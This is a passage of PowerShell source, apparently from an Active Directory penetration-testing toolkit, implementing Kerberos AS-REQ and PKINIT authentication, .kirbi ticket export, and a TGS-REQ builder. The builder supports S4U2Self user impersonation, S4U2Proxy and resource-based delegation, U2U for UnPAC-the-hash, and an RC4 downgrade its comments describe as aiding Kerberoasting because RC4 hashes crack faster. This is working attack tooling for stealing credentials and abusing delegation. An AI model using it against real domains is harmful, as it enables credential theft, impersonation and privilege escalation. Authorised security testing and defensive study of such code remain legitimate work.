                        $pkInitParams['Certificate'] = $Certificate
                        $AuthMethod = "PKINIT (Certificate Object)"
                    }
                    elseif ($Certificate -is [string]) {
                        # String input - could be file path or Base64
                        $certResult = ConvertFrom-Base64OrFile -InputValue $Certificate -ExpectedFormat "Certificate" -ParameterName "Certificate"

                        if (-not $certResult.Success) {
                            return [PSCustomObject]@{
                                Success = $false
                                Method = $AuthMethod
                                UserName = $UserName
                                Domain = $realmUpper
                                DomainController = $DomainController
                                Error = "Certificate error: $($certResult.Error)"
                                ErrorCode = $null  # Certificate errors are not KDC errors
                                Message = "Certificate error: $($certResult.Error)"
                            }
                        }

                        Write-Log "[Invoke-KerberosAuth] Certificate loaded from $($certResult.Source): $($certResult.Data.Length) bytes"

                        # Load the certificate from bytes
                        try {
                            $CertObject = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(
                                $certResult.Data,
                                $CertificatePassword,
                                [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable
                            )
                            $pkInitParams['Certificate'] = $CertObject
                            $AuthMethod = "PKINIT (Certificate from $($certResult.Source))"
                        }
                        catch {
                            return [PSCustomObject]@{
                                Success = $false
                                Method = $AuthMethod
                                UserName = $UserName
                                Domain = $realmUpper
                                DomainController = $DomainController
                                Error = "Failed to load certificate: $_"
                                ErrorCode = $null  # Certificate errors are not KDC errors
                                Message = "Failed to load certificate: $_"
                            }
                        }
                    }
                    else {
                        return [PSCustomObject]@{
                            Success = $false
                            Method = $AuthMethod
                            UserName = $UserName
                            Domain = $realmUpper
                            DomainController = $DomainController
                            Error = "Invalid Certificate parameter type. Expected X509Certificate2, file path, or Base64 string."
                            ErrorCode = $null  # Certificate errors are not KDC errors
                            Message = "Invalid Certificate parameter type"
                        }
                    }

                    if ($OutputKirbi) { $pkInitParams['OutputKirbi'] = $OutputKirbi }

                    $pkInitResult = Invoke-PKINITAuth-Native @pkInitParams

                    # Calculate clock skew for PKINIT
                    $pkInitClockSkew = $null
                    if ($pkInitResult.AuthTime) {
                        $pkInitClockSkew = $pkInitResult.AuthTime - [DateTime]::UtcNow
                    }

                    # Create result object with ScriptMethod for easy ticket copying
                    $resultObj = [PSCustomObject]@{
                        Success = $pkInitResult.Success
                        Method = $AuthMethod
                        UserName = $UserName
                        Domain = $realmUpper
                        DomainController = $DomainController
                        EncryptionType = if ($pkInitResult.EncryptionType) { $pkInitResult.EncryptionType } else { "PKINIT-DH" }
                        Ticket = $pkInitResult.Ticket
                        SessionKey = $pkInitResult.SessionKey
                        SessionKeyBytes = $pkInitResult.SessionKeyBytes
                        TicketBytes = $pkInitResult.TicketBytes
                        TicketFlags = $pkInitResult.TicketFlags
                        ASRepReplyKey = $pkInitResult.ASRepReplyKey  # DH-derived key for UnPAC-the-hash
                        AuthTime = $pkInitResult.AuthTime
                        StartTime = $pkInitResult.StartTime
                        EndTime = $pkInitResult.EndTime
                        RenewTill = $pkInitResult.RenewTill
                        ClockSkew = $pkInitClockSkew
                        Message = if ($pkInitResult.Success) { "PKINIT authentication successful" } else { $pkInitResult.Error }
                        Error = $pkInitResult.Error
                    }

                    # Add helper methods only if authentication was successful
                    if ($pkInitResult.Success -and $pkInitResult.Ticket) {
                        $resultObj = Add-TicketHelperMethods -ResultObject $resultObj
                    }

                    # OutputTicketOnly: Return KRB-CRED as Base64 string (single line, no object)
                    if ($OutputTicketOnly) {
                        if ($pkInitResult.Success -and $pkInitResult.TicketBytes -and $pkInitResult.SessionKeyBytes) {
                            return ConvertTo-KRBCredBase64 -TicketBytes $pkInitResult.TicketBytes `
                                -SessionKeyBytes $pkInitResult.SessionKeyBytes `
                                -SessionKeyType $pkInitResult.EncryptionType `
                                -Realm $realmUpper `
                                -ClientName $UserName `
                                -TicketFlags $pkInitResult.TicketFlags `
                                -StartTime $pkInitResult.StartTime `
                                -EndTime $pkInitResult.EndTime `
                                -RenewTill $pkInitResult.RenewTill
                        } else {
                            Write-Error "PKINIT authentication failed: $($pkInitResult.Error)"
                            return $null
                        }
                    }

                    return $resultObj
                }
            }
            Write-Log "[Invoke-KerberosAuth] $AuthMethod for $UserName@$realmUpper via $DomainController (etype $EType)"

            # For AES password-based authentication, we need the correct salt from the KDC
            # The salt is case-sensitive (RFC 3962) and AD stores usernames with original casing
            # Standard approach: Send AS-REQ without preauth to get PA-ETYPE-INFO2 with correct salt
            $UseKDCSalt = ($AuthMethodType -in @("Credential", "Password")) -and ($EType -in @(17, 18))

            if ($UseKDCSalt) {
                # Step 1: Send AS-REQ without preauth to get PA-ETYPE-INFO2 from KDC
                Write-Log "[Invoke-KerberosAuth] Requesting salt from KDC (AS-REQ without preauth)..."
                $saltReqResult = New-KerberosASREQ -UserName $UserName -Realm $Domain -EType $EType -NoPreAuth
                $saltReqBytes = $saltReqResult.ASReq
                $saltResponseBytes = Send-KerberosRequest -Server $DomainController -Request $saltReqBytes
                $saltResponse = Parse-ASREP -Data $saltResponseBytes

                # We expect KDC_ERR_PREAUTH_REQUIRED (25) with PA-ETYPE-INFO2 in e-data
                if ($saltResponse.ErrorCode -eq 25 -and $saltResponse.ETypeInfo2) {
                    # Extract salt from PA-ETYPE-INFO2
                    $kdcSalt = $saltResponse.ETypeInfo2.Salt
                    # CRITICAL: Use -cne (case-sensitive comparison) because Kerberos salt IS case-sensitive!
                    # PowerShell's -ne is case-insensitive by default, which would miss "Administrator" vs "administrator"
                    if ($kdcSalt -and $kdcSalt -cne $Salt) {
                        Write-Log "[Invoke-KerberosAuth] KDC provided salt: $kdcSalt (differs from default: $Salt)"
                        $Salt = $kdcSalt

                        # Recalculate key with correct salt
                        switch ($EType) {
                            18 { $KeyBytes = Get-AESKeyFromPassword -PlainPassword $PlainPassword -Salt $Salt -KeyLength 32 }
                            17 { $KeyBytes = Get-AESKeyFromPassword -PlainPassword $PlainPassword -Salt $Salt -KeyLength 16 }
                        }
                    } else {
                        Write-Log "[Invoke-KerberosAuth] KDC salt matches default: $Salt"
                    }
                } elseif ($saltResponse.ErrorCode -eq 25) {
                    # PREAUTH_REQUIRED but no PA-ETYPE-INFO2 - use default salt
                    Write-Log "[Invoke-KerberosAuth] KDC requires preauth but no PA-ETYPE-INFO2 provided, using default salt: $Salt"
                } else {
                    # Unexpected response (maybe user doesn't exist, or other error)
                    Write-Log "[Invoke-KerberosAuth] Unexpected response to salt request (error $($saltResponse.ErrorCode)), proceeding with default salt"
                }
            }

            # Build AS-REQ with preauth (using correct salt)
            $asReqResult = New-KerberosASREQ -UserName $UserName -Realm $Domain -Key $KeyBytes -EType $EType -NoPAC:$NoPAC
            $asReqBytes = $asReqResult.ASReq
            Write-Log "[Invoke-KerberosAuth] AS-REQ built ($($asReqBytes.Length) bytes), sending to KDC..."

            # Send to KDC
            $responseBytes = Send-KerberosRequest -Server $DomainController -Request $asReqBytes
            Write-Log "[Invoke-KerberosAuth] Received response ($($responseBytes.Length) bytes)"

            # Parse AS-REP
            $asRep = Parse-ASREP -Data $responseBytes
            if (-not $asRep.Success) {
                # Calculate clock skew from server time if available
                $clockSkew = $null
                if ($asRep.ServerTime) {
                    $clockSkew = $asRep.ServerTime - [DateTime]::UtcNow
                }

                # Return structured error with ErrorCode for upstream handling
                return [PSCustomObject]@{
                    Success = $false
                    Method = $AuthMethod
                    UserName = $UserName
                    Domain = $Domain
                    Error = $asRep.Error
                    ErrorCode = $asRep.ErrorCode  # KDC error code (e.g., 24=KDC_ERR_PREAUTH_FAILED)
                    ClockSkew = $clockSkew  # TimeSpan if server time available
                    Message = "$AuthMethod failed: $($asRep.Error)"
                }
            }
            Write-Log "[Invoke-KerberosAuth] AS-REP received (etype $($asRep.EType), kvno $($asRep.Kvno))"

            # Verify EType matches what we requested
            if ($asRep.EType -ne $EType) {
                Write-Log "[Invoke-KerberosAuth] WARNING: KDC returned etype $($asRep.EType) but we requested etype $EType"
            }

            # Debug: Show key being used for decryption
            $keyHex = ($KeyBytes | ForEach-Object { $_.ToString('X2') }) -join ''
            Write-Log "[Invoke-KerberosAuth] Decrypting with key ($($KeyBytes.Length) bytes): $($keyHex.Substring(0, [Math]::Min(16, $keyHex.Length)))..."
            Write-Log "[Invoke-KerberosAuth] enc-part size: $($asRep.EncPart.Length) bytes"

            # Decrypt enc-part to get session key
            $encRepPart = Parse-EncASRepPart -Data $asRep.EncPart -Key $KeyBytes -EType $asRep.EType
            if (-not $encRepPart.Success) {
                # Decryption failure - but KDC accepted our preauth, so password may be correct!
                # This could happen with very old accounts or edge cases
                Write-Log "[Invoke-KerberosAuth] Decryption failed: $($encRepPart.Error)"

                # Use ErrorCode $null to indicate this is NOT a KDC error - fallback should be attempted
                # The password might still be correct (KDC accepted preauth) but we can't decrypt the response
                return [PSCustomObject]@{
                    Success = $false
                    Method = $AuthMethod
                    UserName = $UserName
                    Domain = $realmUpper
                    DomainController = $DomainController
                    EncryptionType = $asRep.EType
                    Ticket = $null
                    SessionKey = $null
                    SessionKeyBytes = $null
                    TicketBytes = $null
                    Error = "Decryption failed: $($encRepPart.Error)"
                    ErrorCode = $null  # NOT a KDC error - allow fallback to NTLM/SimpleBind
                    Message = "$AuthMethod failed: Cannot decrypt AS-REP (try -ForceSimpleBind)"
                }
            } else {
                $sessionKey = $encRepPart.SessionKey
                Write-Log "[Invoke-KerberosAuth] Session key extracted ($($sessionKey.Length) bytes, type $($encRepPart.SessionKeyType))"
                if ($encRepPart.EndTime) {
                    Write-Log "[Invoke-KerberosAuth] TGT valid until: $($encRepPart.EndTime.ToString('yyyy-MM-dd HH:mm:ss')) UTC"
                }
                if ($encRepPart.RenewTill) {
                    Write-Log "[Invoke-KerberosAuth] Renewable until: $($encRepPart.RenewTill.ToString('yyyy-MM-dd HH:mm:ss')) UTC"
                }
            }

            # Build result
            $ticketB64 = [Convert]::ToBase64String($asRep.Ticket)
            $sessionKeyB64 = if ($sessionKey) { [Convert]::ToBase64String($sessionKey) } else { $null }

            # Optional: Save as .kirbi (KRB-CRED format with session key)
            if ($OutputKirbi) {
                if (-not $sessionKey) {
                    Write-Warning "[Invoke-KerberosAuth] Cannot save kirbi: Session key not available (decryption failed)"
                } else {
                    # Build proper KRB-CRED structure (not just raw ticket!)
                    $krbCredBytes = Build-KRBCred -Ticket $asRep.Ticket `
                        -SessionKey $sessionKey `
                        -SessionKeyType $asRep.EType `
                        -Realm $realmUpper `
                        -ClientName $UserName `
                        -ServerName "krbtgt" `
                        -ServerInstance $realmUpper `
                        -StartTime $encRepPart.StartTime `
                        -EndTime $encRepPart.EndTime `
                        -RenewTill $encRepPart.RenewTill

                    $exportResult = Export-adPEASFile -Path $OutputKirbi -Content $krbCredBytes -Type Binary -Force
                    if ($exportResult.Success) {
                        Write-Log "[Invoke-KerberosAuth] Kirbi (KRB-CRED) saved to: $($exportResult.Path) ($($exportResult.BytesWritten) bytes)"
                    } else {
                        Write-Warning "[Invoke-KerberosAuth] Failed to save kirbi: $($exportResult.Message)"
                    }
                }
            }

            # Calculate clock skew between local system and KDC
            $clockSkew = $null
            if ($encRepPart.AuthTime) {
                $clockSkew = $encRepPart.AuthTime - [DateTime]::UtcNow
            }

            # Create result object with ScriptMethod for easy ticket copying
            $resultObj = [PSCustomObject]@{
                Success = $true
                Method = $AuthMethod
                UserName = $UserName
                Domain = $realmUpper
                DomainController = $DomainController
                EncryptionType = $asRep.EType
                Ticket = $ticketB64
                SessionKey = $sessionKeyB64
                SessionKeyBytes = $sessionKey
                TicketBytes = $asRep.Ticket
                TicketFlags = $encRepPart.TicketFlags
                AuthTime = $encRepPart.AuthTime
                StartTime = $encRepPart.StartTime
                EndTime = $encRepPart.EndTime
                RenewTill = $encRepPart.RenewTill
                ClockSkew = $clockSkew  # TimeSpan: KDC time minus local UTC time
                Error = $null
                ErrorCode = $null  # No error on success
                Message = "$AuthMethod authentication successful"
            }

            # Add helper methods for ticket handling
            $resultObj = Add-TicketHelperMethods -ResultObject $resultObj

            # OutputTicketOnly: Return KRB-CRED as Base64 string (single line, no object)
            if ($OutputTicketOnly) {
                if (-not $sessionKey) {
                    Write-Error "Cannot create KRB-CRED: Session key not available (decryption failed)"
                    return $null
                }
                $krbCredB64 = ConvertTo-KRBCredBase64 -TicketBytes $asRep.Ticket `
                    -SessionKeyBytes $sessionKey `
                    -SessionKeyType $asRep.EType `
                    -Realm $realmUpper `
                    -ClientName $UserName `
                    -TicketFlags $encRepPart.TicketFlags `
                    -StartTime $encRepPart.StartTime `
                    -EndTime $encRepPart.EndTime `
                    -RenewTill $encRepPart.RenewTill
                if (-not $krbCredB64) {
                    Write-Error "Failed to create KRB-CRED"
                    return $null
                }
                return $krbCredB64
            }

            return $resultObj
        }
        catch {
            Write-Log "[Invoke-KerberosAuth] $AuthMethod failed: $_"
            Write-Debug "[Invoke-KerberosAuth] Error details: $($_.Exception.ToString())"

            # Detect network errors (connection refused, host unreachable, etc.)
            # These are NOT authentication errors and should be reported differently
            $IsNetworkError = $false
            $NetworkErrorServer = $null
            $NetworkErrorPort = 88

            # Check for socket/network exceptions
            $innerEx = $_.Exception
            while ($innerEx) {
                if ($innerEx -is [System.Net.Sockets.SocketException] -or
                    $innerEx.Message -match 'No connection could be made|actively refused|target machine|cannot be reached|network is unreachable|host is down|timed out') {
                    $IsNetworkError = $true
                    $NetworkErrorServer = $DomainController
                    break
                }
                $innerEx = $innerEx.InnerException
            }

            # OutputTicketOnly: Return null on error (error message already written)
            if ($OutputTicketOnly) {
                Write-Error "$AuthMethod failed: $_"
                return $null
            }

            return [PSCustomObject]@{
                Success = $false
                Method = $AuthMethod
                UserName = $UserName
                Domain = $Domain
                Error = $_.Exception.Message
                ErrorCode = $null  # Non-KDC errors don't have error codes
                Message = "$AuthMethod failed: $_"
                IsNetworkError = $IsNetworkError
                NetworkErrorServer = $NetworkErrorServer
                NetworkErrorPort = $NetworkErrorPort
            }
        }
    }

    end {
        Write-Log "[Invoke-KerberosAuth] Kerberos authentication completed"
    }
}



# ----- Request-ServiceTicket.ps1 -----

function Request-ServiceTicket {
<#
.SYNOPSIS
    Requests a Kerberos Service Ticket (TGS) using a TGT.

.DESCRIPTION
    This function implements the TGS-REQ/TGS-REP exchange to obtain a service ticket for a specific Service Principal Name (SPN).
    It uses a previously acquired TGT to request the service ticket from the KDC.

    The function supports four distinct modes (parameter sets):
    - Normal: Standard TGS-REQ for a service ticket
    - U2U: User-to-User ticket exchange (for UnPAC-the-Hash)
    - S4U2Self: Protocol Transition (impersonate user to self)
    - S4U2Proxy: Constrained Delegation (forward impersonated ticket to target service)

    Common use cases:
    - Request LDAP service ticket: ldap/<dc>
    - Request CIFS service ticket: cifs/<server>
    - Request HTTP service ticket: http/<server>

.PARAMETER TGT
    The TGT ticket bytes (from AS-REP).

.PARAMETER SessionKey
    The session key bytes from the TGT.

.PARAMETER SessionKeyType
    The encryption type of the session key (17=AES128, 18=AES256, 23=RC4).

.PARAMETER ServicePrincipalName
    The SPN to request a ticket for (e.g., "ldap/dc01.contoso.com").

.PARAMETER Domain
    The target domain (realm).

.PARAMETER DomainController
    The KDC to send the TGS-REQ to.

.PARAMETER UserName
    The user name (cname from TGT).

.PARAMETER DowngradeToRC4
    If specified, only requests RC4 encryption (etype 23). This forces the KDC to use RC4 if the target service account supports it.
    Useful for Kerberoasting as RC4 hashes are much faster to crack than AES.

.PARAMETER RequestedEtype
    If specified, only requests this specific encryption type (17=AES128, 18=AES256, 23=RC4).
    Used internally for fallback logic in Kerberoasting.

.PARAMETER U2U
    Enables User-to-User (U2U) mode. Sets enc-tkt-in-skey KDC option and includes
    the TGT as additional-ticket. The ServicePrincipalName should be the target username
    (not an SPN). Used for UnPAC-the-hash to recover NT hash from PKINIT authentication.

.PARAMETER S4U2Self
    Enables S4U2Self (Protocol Transition) mode. Requests a service ticket to
    the service account itself on behalf of another user via PA-FOR-USER (type 129).
    Requires -ImpersonateUser. The ServicePrincipalName should be the service account's
    own username (ticket to self).

.PARAMETER ImpersonateUser
    The sAMAccountName of the user to impersonate (used with -S4U2Self).

.PARAMETER ImpersonateRealm
    The realm of the user to impersonate. Defaults to the target domain if not specified.

.PARAMETER S4U2Proxy
    Enables S4U2Proxy (Constrained Delegation) mode. Forwards a S4U2Self service ticket
    to a target service using the CnameInAddlTkt KDC option. Requires -AdditionalTicket
    containing the S4U2Self ticket bytes.

.PARAMETER AdditionalTicket
    The S4U2Self service ticket bytes to forward via S4U2Proxy. These are the raw
    Ticket APPLICATION 1 bytes from the S4U2Self TGS-REP (TicketBytes property).
    Only used with -S4U2Proxy parameter.

.PARAMETER ResourceBased
    When used with -S4U2Proxy, adds PA-PAC-OPTIONS (type 167) with the
    resource-based-constrained-delegation-allowed flag (bit 3). Required for RBCD
    but not for classic constrained delegation.

.EXAMPLE
    $tgsResult = Request-ServiceTicket -TGT $tgt.TicketBytes -SessionKey $tgt.SessionKeyBytes `
                                       -SessionKeyType 18 -ServicePrincipalName "ldap/dc01.contoso.com" `
                                       -Domain "contoso.com" -DomainController "dc01.contoso.com" `
                                       -UserName "admin"

.OUTPUTS
    PSCustomObject with service ticket and session key.

.NOTES
    Author: Alexander Sturz (@_61106960_)
    References:
    - RFC 4120: Kerberos V5 - TGS-REQ/TGS-REP
    - MS-KILE: Microsoft Kerberos Protocol Extensions
#>
    [CmdletBinding(DefaultParameterSetName='Normal')]
    param(
        [Parameter(Mandatory=$true)]
        [ValidateScript({ $_.Length -gt 0 })]
        [byte[]]$TGT,

        [Parameter(Mandatory=$true)]
        [ValidateScript({ $_.Length -gt 0 })]
        [byte[]]$SessionKey,

        [Parameter(Mandatory=$true)]
        [ValidateSet(17, 18, 23)]
        [int]$SessionKeyType,

        [Parameter(Mandatory=$true)]
        [string]$ServicePrincipalName,

        [Parameter(Mandatory=$true)]
        [string]$Domain,

        [Parameter(Mandatory=$true)]
        [string]$DomainController,

        [Parameter(Mandatory=$true)]
        [string]$UserName,

        [Parameter(Mandatory=$false)]
        [switch]$DowngradeToRC4,

        [Parameter(Mandatory=$false)]
        [ValidateSet(17, 18, 23)]
        [int]$RequestedEtype,

        [Parameter(Mandatory=$false, ParameterSetName='U2U')]
        [switch]$U2U,

        [Parameter(Mandatory=$false, ParameterSetName='S4U2Self')]
        [switch]$S4U2Self,

        [Parameter(Mandatory=$false, ParameterSetName='S4U2Self')]
        [Parameter(Mandatory=$false, ParameterSetName='S4U2Proxy')]
        [string]$ImpersonateUser,

        [Parameter(Mandatory=$false, ParameterSetName='S4U2Self')]
        [Parameter(Mandatory=$false, ParameterSetName='S4U2Proxy')]
        [string]$ImpersonateRealm,

        [Parameter(Mandatory=$false, ParameterSetName='S4U2Proxy')]
        [switch]$S4U2Proxy,

        [Parameter(Mandatory=$false, ParameterSetName='S4U2Proxy')]
        [ValidateScript({ $_.Length -gt 0 })]
        [byte[]]$AdditionalTicket,

        [Parameter(Mandatory=$false, ParameterSetName='S4U2Proxy')]
        [switch]$ResourceBased
    )

    begin {
        Write-Log "[Request-ServiceTicket] Starting TGS-REQ for SPN: $ServicePrincipalName"

        # Resolve DomainController to IP if custom DNS is configured (uses unified Resolve-adPEASName)
        if ($Script:LDAPContext -and $Script:LDAPContext['DnsServer']) {
            $ipTest = $null
            if (-not [System.Net.IPAddress]::TryParse($DomainController, [ref]$ipTest)) {
                # Use -Name since DomainController is explicit (no DC discovery needed)
                $ResolvedIP = Resolve-adPEASName -Name $DomainController -DnsServer $Script:LDAPContext['DnsServer']
                if ($ResolvedIP) {
                    Write-Log "[Request-ServiceTicket] Resolved $DomainController to IP: $ResolvedIP"
                    $DomainController = $ResolvedIP
                }
                else {
                    Write-Log "[Request-ServiceTicket] WARNING: Could not resolve $DomainController to IP address"
                }
            }
        }

        function New-KerberosTGSREQ {
            param(
                [byte[]]$TGT,
                [byte[]]$SessionKey,
                [int]$SessionKeyType,
                [string]$UserName,
                [string]$Realm,
                [string]$ServiceName,
                [string]$ServiceInstance,
                [switch]$U2U,
                [byte[]]$AdditionalTicket,
                [switch]$S4U2Self,
                [string]$ImpersonateUser,
                [string]$ImpersonateRealm,
                [byte[]]$S4U2SelfTicket,
                [switch]$S4U2Proxy,
                [switch]$ResourceBased
            )

            $realmUpper = $Realm.ToUpper()
            $nonce = [uint32](Get-Random -Minimum 1 -Maximum 2147483647)

            # Build Authenticator
            # Authenticator ::= [APPLICATION 2] SEQUENCE {
            #   authenticator-vno [0] INTEGER,
            #   crealm [1] Realm,
            #   cname [2] PrincipalName,
            #   cksum [3] Checksum OPTIONAL,
            #   cusec [4] Microseconds,
            #   ctime [5] KerberosTime,
            #   subkey [6] EncryptionKey OPTIONAL,
            #   seq-number [7] UInt32 OPTIONAL
            # }

            $now = [datetime]::UtcNow
            $cusec = $now.Millisecond * 1000

            # cname for authenticator
            $cname = New-KerberosPrincipalName -NameType $Script:NT_PRINCIPAL -NameStrings @($UserName)

            $authContent = @()
            $authContent += New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 5)  # authenticator-vno
            $authContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1GeneralString -Value $realmUpper)  # crealm
            $authContent += New-ASN1ContextTag -Tag 2 -Data $cname  # cname
            $authContent += New-ASN1ContextTag -Tag 4 -Data (New-ASN1Integer -Value $cusec)  # cusec
            $authContent += New-ASN1ContextTag -Tag 5 -Data (New-ASN1GeneralizedTime -Value $now)  # ctime

            $authSeq = New-ASN1Sequence -Data $authContent
            $authenticator = New-ASN1ApplicationTag -Tag 2 -Data $authSeq

            # Encrypt authenticator with TGT session key
            # Key usage 7 for TGS-REQ PA-TGS-REQ authenticator
            $keyUsage = 7

            # Use Windows native crypto for encryption (same as Rubeus)
            $encAuthenticator = Protect-KerberosNative -Key $SessionKey -Data $authenticator -KeyUsage $keyUsage -EncryptionType $SessionKeyType
            if (-not $encAuthenticator) {
                throw "Failed to encrypt authenticator"
            }

            # Build AP-REQ for PA-TGS-REQ
            # AP-REQ ::= [APPLICATION 14] SEQUENCE {
            #   pvno [0] INTEGER,
            #   msg-type [1] INTEGER,
            #   ap-options [2] APOptions,
            #   ticket [3] Ticket,
            #   authenticator [4] EncryptedData
            # }

            # EncryptedData for authenticator
            $encDataContent = @()
            $encDataContent += New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value $SessionKeyType)  # etype
            $encDataContent += New-ASN1ContextTag -Tag 2 -Data (New-ASN1OctetString -Value $encAuthenticator)  # cipher
            $encData = New-ASN1Sequence -Data $encDataContent

            # AP-Options (no options set)
            $apOptions = New-ASN1BitString -Value @(0x00, 0x00, 0x00, 0x00) -UnusedBits 0

            $apReqContent = @()
            $apReqContent += New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 5)  # pvno
            $apReqContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1Integer -Value 14)  # msg-type (AP-REQ)
            $apReqContent += New-ASN1ContextTag -Tag 2 -Data $apOptions  # ap-options
            $apReqContent += New-ASN1ContextTag -Tag 3 -Data $TGT  # ticket
            $apReqContent += New-ASN1ContextTag -Tag 4 -Data $encData  # authenticator

            $apReqSeq = New-ASN1Sequence -Data $apReqContent
            $apReq = New-ASN1ApplicationTag -Tag 14 -Data $apReqSeq

            # PA-TGS-REQ padata
            $paTgsReq = New-KerberosPAData -PADataType $Script:PA_TGS_REQ -PADataValue $apReq

            # PA-PAC-REQUEST
            $pacRequest = New-ASN1Sequence -Data (New-ASN1ContextTag -Tag 0 -Data (New-ASN1Boolean -Value $true))
            $paPacReq = New-KerberosPAData -PADataType $Script:PA_PAC_REQUEST -PADataValue $pacRequest

            $padataItems = @($paTgsReq, $paPacReq)

            # S4U2Self: Add PA-FOR-USER (type 129) - Protocol Transition
            # MS-SFU 3.2: Requests a service ticket on behalf of another user
            if ($S4U2Self -and $ImpersonateUser) {
                $s4uRealm = if ($ImpersonateRealm) { $ImpersonateRealm.ToUpper() } else { $realmUpper }

                # PA-FOR-USER ::= SEQUENCE {
                #   userName      [0] PrincipalName (NT_ENTERPRISE=10),
                #   userRealm     [1] Realm,
                #   cksum         [2] Checksum (type -138, HMAC-MD5),
                #   auth-package  [3] KerberosString ("Kerberos")
                # }

                # Build checksum data: nameType(4LE) + name(UTF8) + realm(UTF8) + "Kerberos"(UTF8)
                $nameTypeBytes = [System.BitConverter]::GetBytes([int32]$Script:NT_ENTERPRISE)  # 4 bytes LE
                $nameBytes = [System.Text.Encoding]::UTF8.GetBytes($ImpersonateUser)
                $realmBytes = [System.Text.Encoding]::UTF8.GetBytes($s4uRealm)
                $authPkgBytes = [System.Text.Encoding]::UTF8.GetBytes("Kerberos")

                $checksumData = $nameTypeBytes + $nameBytes + $realmBytes + $authPkgBytes
                $checksumValue = Get-HMACMD5 -Key $SessionKey -Data $checksumData

                # Build Checksum structure: { cksumtype [0] Int32, checksum [1] OCTET STRING }
                $checksumContent = @()
                $checksumContent += New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value ([int32]-138))  # HMAC-MD5 for S4U
                $checksumContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1OctetString -Value $checksumValue)
                $checksumSeq = New-ASN1Sequence -Data $checksumContent

                # Build PA-FOR-USER structure
                $paForUserContent = @()
                $userName4U = New-KerberosPrincipalName -NameType $Script:NT_ENTERPRISE -NameStrings @($ImpersonateUser)
                $paForUserContent += New-ASN1ContextTag -Tag 0 -Data $userName4U
                $paForUserContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1GeneralString -Value $s4uRealm)
                $paForUserContent += New-ASN1ContextTag -Tag 2 -Data $checksumSeq
                $paForUserContent += New-ASN1ContextTag -Tag 3 -Data (New-ASN1GeneralString -Value "Kerberos")
                $paForUserSeq = New-ASN1Sequence -Data $paForUserContent

                $paForUser = New-KerberosPAData -PADataType $Script:PA_FOR_USER -PADataValue $paForUserSeq
                $padataItems += $paForUser
                Write-Log "[New-KerberosTGSREQ] Added PA-FOR-USER for '$ImpersonateUser@$s4uRealm'"
            }

            # S4U2Proxy + RBCD: Add PA-PAC-OPTIONS (type 167) with resource-based flag
            if ($S4U2Proxy -and $ResourceBased) {
                # PA-PAC-OPTIONS ::= SEQUENCE { flags [0] BIT STRING }
                # Bit 3 = resource-based-constrained-delegation-allowed (0x10000000)
                $pacOptionsFlags = [System.BitConverter]::GetBytes([uint32]0x10000000)
                [Array]::Reverse($pacOptionsFlags)  # big-endian
                $pacOptionsBitString = New-ASN1BitString -Value $pacOptionsFlags -UnusedBits 0
                $pacOptionsSeq = New-ASN1Sequence -Data (New-ASN1ContextTag -Tag 0 -Data $pacOptionsBitString)
                $paPacOptions = New-KerberosPAData -PADataType $Script:PA_PAC_OPTIONS -PADataValue $pacOptionsSeq
                $padataItems += $paPacOptions
                Write-Log "[New-KerberosTGSREQ] Added PA-PAC-OPTIONS with RBCD flag"
            }

            $padata = New-ASN1Sequence -Data ($padataItems | ForEach-Object { $_ })

            # KDC-OPTIONS for TGS-REQ
            if ($U2U) {
                # U2U: enc-tkt-in-skey tells KDC to encrypt service ticket with the additional ticket's session key
                $kdcOptions = New-KerberosKDCOptions -Forwardable -Renewable -Canonicalize -EncTktInSkey
            } elseif ($S4U2Proxy) {
                # S4U2Proxy: CnameInAddlTkt tells KDC to use the client name from the additional ticket
                $kdcOptions = New-KerberosKDCOptions -Forwardable -Renewable -Canonicalize -CnameInAddlTkt
            } else {
                $kdcOptions = New-KerberosKDCOptions -Forwardable -Renewable -Canonicalize
            }

            # sname - service principal
            if ($U2U) {
                # U2U: sname is the target user principal (NT_UNKNOWN with just the username)
                $sname = New-KerberosPrincipalName -NameType $Script:NT_UNKNOWN -NameStrings @($ServiceName)
            } elseif ($S4U2Self) {
                # S4U2Self: sname is the service account itself (ticket to self)
                $sname = New-KerberosPrincipalName -NameType $Script:NT_UNKNOWN -NameStrings @($ServiceName)
            } else {
                $sname = New-KerberosPrincipalName -NameType $Script:NT_SRV_INST -NameStrings @($ServiceName, $ServiceInstance)
            }

            # till
            $till = [datetime]::new(2037, 9, 13, 2, 48, 5, [System.DateTimeKind]::Utc)

            # etype - encryption types to offer to KDC
            # Priority: RequestedEtype (specific) > DowngradeToRC4 (RC4 only) > default (all types)
            $etypeList = @()
            if ($RequestedEtype) {
                # Specific etype requested (used for fallback logic)
                $etypeList += New-ASN1Integer -Value $RequestedEtype
                Write-Log "[Request-ServiceTicket] Requesting specific etype $RequestedEtype only"
            } elseif ($DowngradeToRC4) {
                # Only offer RC4-HMAC - forces KDC to use RC4 if account supports it
                $etypeList += New-ASN1Integer -Value 23  # RC4-HMAC only
                Write-Log "[Request-ServiceTicket] Requesting RC4 downgrade (etype 23 only)"
            } else {
                # Offer all types - RC4 first (preferred for cracking), then AES
                $etypeList += New-ASN1Integer -Value 23  # RC4-HMAC (weakest - preferred for Kerberoasting)
                $etypeList += New-ASN1Integer -Value 17  # AES128-CTS-HMAC-SHA1-96
                $etypeList += New-ASN1Integer -Value 18  # AES256-CTS-HMAC-SHA1-96
            }

            # KDC-REQ-BODY
            $reqBodyContent = @()
            $reqBodyContent += New-ASN1ContextTag -Tag 0 -Data $kdcOptions
            $reqBodyContent += New-ASN1ContextTag -Tag 2 -Data (New-ASN1GeneralString -Value $realmUpper)  # realm
            $reqBodyContent += New-ASN1ContextTag -Tag 3 -Data $sname  # sname
            $reqBodyContent += New-ASN1ContextTag -Tag 5 -Data (New-ASN1GeneralizedTime -Value $till)  # till
            $reqBodyContent += New-ASN1ContextTag -Tag 7 -Data (New-ASN1Integer -Value $nonce)  # nonce
            $reqBodyContent += New-ASN1ContextTag -Tag 8 -Data (New-ASN1Sequence -Data $etypeList)  # etype

            # additional-tickets [11]
            # U2U: Contains the TGT whose session key encrypts the service ticket
            # S4U2Proxy: Contains the S4U2Self service ticket to forward
            if ($U2U -and $AdditionalTicket) {
